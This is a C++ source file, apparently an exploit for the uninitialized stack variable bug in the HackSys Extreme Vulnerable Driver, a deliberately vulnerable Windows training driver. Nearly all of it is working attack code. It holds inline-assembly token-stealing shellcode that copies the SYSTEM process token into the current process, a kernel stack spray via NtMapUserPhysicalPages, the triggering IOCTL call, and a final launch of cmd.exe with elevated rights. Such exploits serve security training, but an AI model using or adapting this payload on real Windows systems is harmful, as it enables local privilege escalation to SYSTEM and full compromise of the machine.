#include "Base.h"

#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

VOID ExchangeToken() {
	__asm {
		pushad
		xor eax, eax
		mov eax, fs:[eax + KTHREAD_OFFSET]
		mov eax, [eax + EPROCESS_OFFSET]
		mov ecx, eax
		mov edx, SYSTEM_PID
		SearchSystemPID:
			mov eax, [eax + FLINK_OFFSET]
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx
			jne SearchSystemPID
		mov edx, [eax + TOKEN_OFFSET]
		mov[ecx + TOKEN_OFFSET], edx
		popad
		pop edi
		pop esi
		pop ebx
		retn
	}
}

typedef NTSTATUS(WINAPI *PNtMapUserPhysicalPages) (
	PLONG BaseAddress,
	SIZE_T NumberOfPages,
	PULONG PageFrameNumbers
);

int main()
{
	getchar();
	ULONG data = 0xdeadbeef;
	unsigned long sprayBuffer[1024];
	for (int i = 0; i < 1024; i++)
		sprayBuffer[i] = (unsigned long)(&ExchangeToken);
	std::auto_ptr<BaseIoctl> ap(new BaseIoctl());


	ap->OpenDevice();
	FARPROC proc = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapUserPhysicalPages");
	PNtMapUserPhysicalPages NtMapUserPhysicalPages = (PNtMapUserPhysicalPages)proc;
	NtMapUserPhysicalPages(NULL, 1024, sprayBuffer);
	ap->sendData((const char *)(&data), 0, HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE);
	ap->CloseDevice();
	WinExec("C:\\Windows\\system32\\cmd.exe", NULL);

	return 0;
}